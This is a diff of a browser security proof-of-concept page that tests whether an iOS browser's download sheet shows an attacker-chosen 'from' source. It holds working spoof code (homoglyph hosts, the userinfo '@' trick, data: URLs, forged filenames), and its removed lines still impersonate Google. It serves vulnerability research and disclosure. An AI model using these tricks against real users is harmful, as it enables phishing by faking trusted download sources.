@@ -18,27 +18,30 @@ code{font-family:ui-monospace,monospace;font-size:11px;color:#555;word-break:bre
 <body>
 <div class="banner">Security research PoC</div>
 <h2>Download "from …" source spoof</h2>
-<p>Each button opens the iOS download sheet. <b>Read the small "from …" line under the filename.</b> Goal: can that trusted-source line be made to read <code>accounts.google.com</code>?</p>
+<p>Each button opens the iOS download sheet. <b>Read the small "from …" line under the filename.</b> Test question: is that trusted-source line attacker-controlled? A neutral placeholder host (<code>trusted-site.example</code>) stands in for any real brand — the behavior is domain-independent.</p>
 
-<button onclick="b1()">1 — data: source as a google URL (text)</button>
-<div class="info">href is a plain data: URL whose text is <code>https://accounts.google.com/…</code>. Does the "from" line show google.com?</div>
+<button onclick="b1()">1 — data: source shown as a full URL (text)</button>
+<div class="info">href is a plain data: URL whose text is <code>https://accounts.trusted-site.example/…</code>. Does the "from" line echo that host string verbatim?</div>
 
-<button onclick="b2()">2 — homoglyph google (Cyrillic letters)</button>
-<div class="info">Same, but the host uses look-alike Cyrillic letters. Does it render as "google.com" or punycode/xn--?</div>
+<button onclick="b2()">2 — homoglyph host (Cyrillic look-alikes)</button>
+<div class="info">Host uses look-alike Unicode letters. Does Arc render it as-is (spoofable) or convert to punycode / <code>xn--</code>?</div>
 
 <button onclick="b3()">3 — userinfo @ trick</button>
-<div class="info"><code>https://accounts.google.com@…</code> — real host is elsewhere. Does the sheet show google.com first?</div>
+<div class="info"><code>https://accounts.trusted-site.example@…</code> — the real host is after the @. Does the sheet show the trusted-looking part first?</div>
 
-<button onclick="b4()" style="background:#34c759">4 — real file hosted on google.com</button>
-<div class="info">Downloads a real asset from www.google.com. Does "from" honestly show www.google.com?</div>
+<button onclick="b4()" style="background:#34c759">4 — real cross-origin file</button>
+<div class="info">Downloads a real file from another host. Does "from" honestly show that host, and does a long host get truncated (front or back)?</div>
 
 <button onclick="b5()" style="background:#ff9500">5 — blob from no-origin popup</button>
-<div class="info">Creates the download inside the empty-bar popup. What origin does "from" show — blob:null, or an inherited one?</div>
+<div class="info">Creates the download inside the empty-bar popup. What origin does "from" show — <code>blob:null</code>, or an inherited one? (Ties to the empty-origin bug.)</div>
 
-<button onclick="b6()" style="background:#af52de">6 — filename-only spoof</button>
-<div class="info">Neutral source, but filename is fully attacker-chosen. Shows how prominent/controllable the filename line is.</div>
+<button onclick="b6()" style="background:#af52de">6 — filename-only control</button>
+<div class="info">Neutral source, but the filename line is fully attacker-chosen. Shows how prominent/controllable that line is.</div>
 
 <script>
+// Neutral placeholder host — stands in for any real brand in the report narrative.
+var HOST='accounts.trusted-site.example';
+
 function dl(href,name){
   var a=document.createElement('a');
   a.href=href;a.download=name;
@@ -47,31 +50,32 @@ function dl(href,name){
   setTimeout(function(){a.remove()},1000);
 }
 
-// 1: plain-text data: URL whose visible text is a google URL
+// 1: plain-text data: URL whose visible text is a full trusted-looking URL
 function b1(){
-  dl('data:text/plain,https://accounts.google.com/account/document-download','document.txt');
+  dl('data:text/plain,https://'+HOST+'/account/document-download','document.txt');
 }
 
-// 2: homoglyph host (Cyrillic а с о о) inside a data: URL text
+// 2: homoglyph host (Cyrillic а е о) built at runtime
 function b2(){
-  dl('data:text/plain,https://ассоunts.gооgle.com/verify','document.txt');
+  var homo='https://аccounts.trustеd-sitе.example/verify';
+  dl('data:text/plain,'+homo,'document.txt');
 }
 
-// 3: userinfo authority — google.com as username, real host after @
+// 3: userinfo authority — trusted host as username, real host after @
 function b3(){
   var a=document.createElement('a');
-  a.href='https://accounts.google.com@example.com/document.txt';
+  a.href='https://'+HOST+'@example.org/document.txt';
   a.download='document.txt';
   a.style.display='none';
   document.body.appendChild(a);a.click();
   setTimeout(function(){a.remove()},1000);
 }
 
-// 4: genuine cross-origin file on google.com
+// 4: genuine cross-origin file on a real host (long host to test truncation)
 function b4(){
   var a=document.createElement('a');
-  a.href='https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png';
-  a.download='image.png';
+  a.href='https://raw.githubusercontent.com/Ajaone/testing-repository/main/test/oembed.json';
+  a.download='data.json';
   a.target='_self';
   a.style.display='none';
   document.body.appendChild(a);a.click();
@@ -81,7 +85,7 @@ function b4(){
 // 5: blob download from inside the no-origin popup
 function b5(){
   var a=document.createElement('a');
-  a.href='https://accounts.google.com/signin/v2/identifier';
+  a.href='https://example.com/';
   a.target='dlpop';
   a.style.display='none';
   document.body.appendChild(a);a.click();a.remove();
@@ -103,9 +107,9 @@ function b5(){
   },50);
 }
 
-// 6: filename fully attacker-controlled
+// 6: filename fully attacker-controlled (neutral wording)
 function b6(){
-  dl('data:text/plain,harmless','Google Account - verify document.txt');
+  dl('data:text/plain,harmless','Account statement - please review.txt');
 }
 </script>
 </body>
